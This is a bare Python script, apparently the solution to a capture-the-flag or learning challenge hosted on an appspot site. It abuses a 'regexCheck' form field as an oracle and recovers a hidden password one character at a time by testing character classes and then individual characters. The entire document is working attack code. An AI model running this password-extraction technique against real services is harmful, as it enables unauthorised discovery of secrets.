
import requests

def matching_alpha_maj(result) :
    for i in range(65,91) :
        val = result + chr(i)
        r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
        if r.text.__contains__("The Regex match with the password"):
            return  chr(i)

def matching_alpha_min(result) :
    for i in range(97,123) :
        val = result + chr(i)
        r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
        if r.text.__contains__("The Regex match with the password"):
            return  chr(i)

def matching_num(result) :
    for i in range(48,58) :
        val = result + chr(i)
        r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
        if r.text.__contains__("The Regex match with the password"):
            return  chr(i)

def matching_char(result) :
    char_asccii = [32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 92 , 93, 94, 95, 96, 123, 124, 125, 126]
    for i in char_asccii :
        val = result + "\\"+chr(i)
        r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
        if r.text.__contains__("The Regex match with the password"):
            return  chr(i)



result = ""
regex=""

for j in range(0,47) :
    val = regex + "[A-Z]"
    r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
    if r.text.__contains__("The Regex match with the password"):
        regex += "[A-Z]"
        result += matching_alpha_maj(result)
    else :
        val = regex + "[a-z]"
        r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
        if r.text.__contains__("The Regex match with the password"):
            regex += "[a-z]"
            result += matching_alpha_min(result)
        else :
            val = regex + "\d"
            r = requests.post('https://learn-gcp-286602.uc.r.appspot.com/', data={'regexCheck': val})
            if r.text.__contains__("The Regex match with the password"):
                regex += "\d"
                result += matching_num(result)
            else :
                caracter = matching_char(result)
                print(caracter)
                result += caracter
                regex += "\\" + caracter
    print(result)


print("finish")
print(result)
